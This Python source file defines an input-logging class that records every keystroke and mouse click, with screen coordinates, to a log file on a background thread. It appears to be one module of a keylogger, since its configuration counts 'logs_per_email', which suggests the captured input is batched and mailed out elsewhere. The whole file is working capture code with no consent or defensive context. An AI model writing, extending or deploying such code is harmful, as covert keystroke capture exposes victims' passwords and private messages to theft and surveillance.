from os.path import join
import threading
from pynput.keyboard import Listener as KeyboardListener, Key
from pynput.mouse import Listener as MouseListener, Button
from config.config_loader import get_section_config
from core.utils.logging_utils import log_data, log_error

class InputLogger:
    def __init__(self):
        self.config = get_section_config("INPUT")
        self.log_file_path = join(self.config["logs_directory_path"], "input.txt")
        self.error_file_path = join(self.config["logs_directory_path"], "errors.txt")
        self.counter = 0
        self.counter_max = self.config["logs_per_email"]
        self.keyboard_thread = None
        self.mouse_thread = None
        self.keyboard_listener = None
        self.mouse_listener = None
        self.stop_event = threading.Event()

    def on_keyboard_press(self, key: Key):
        log_data(self.log_file_path, f"KEYBOARD PRESSED {str(key)}")

    def on_keyboard_release(self, key: Key):
        log_data(self.log_file_path, f"KEYBOARD RELEASED {str(key)}")

    def on_mouse_click(self, x: int, y: int, button: Button, pressed: bool):
        action = "PRESSED" if pressed else "RELEASED"
        log_data(self.log_file_path, f"MOUSE {action} {str(button)} AT {x}, {y}")

    def run(self):
        print("Input logger started.")
        try:
            self.keyboard_listener = KeyboardListener(on_press=self.on_keyboard_press, on_release=self.on_keyboard_release)
            self.mouse_listener = MouseListener(on_click=self.on_mouse_click)

            self.keyboard_listener.start()
            self.mouse_listener.start()

            self.keyboard_listener.join()
            self.mouse_listener.join()
        except Exception as e:
            log_error(self.error_file_path, e)

    def start(self):
        if not self.keyboard_thread or not self.keyboard_thread.is_alive():
            self.keyboard_thread = threading.Thread(target=self.run, name="InputLogger")
            self.keyboard_thread.start()
        else:
            print("Attempted to start input logger while it has already started!")

    def stop(self):
        self.stop_event.set()
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        if self.mouse_listener:
            self.mouse_listener.stop()

        if self.keyboard_thread and self.keyboard_thread.is_alive():
            self.keyboard_thread.join()
            print("Input logger stopped.")
        else:
            print("Attempted to stop input logger while it has not started!")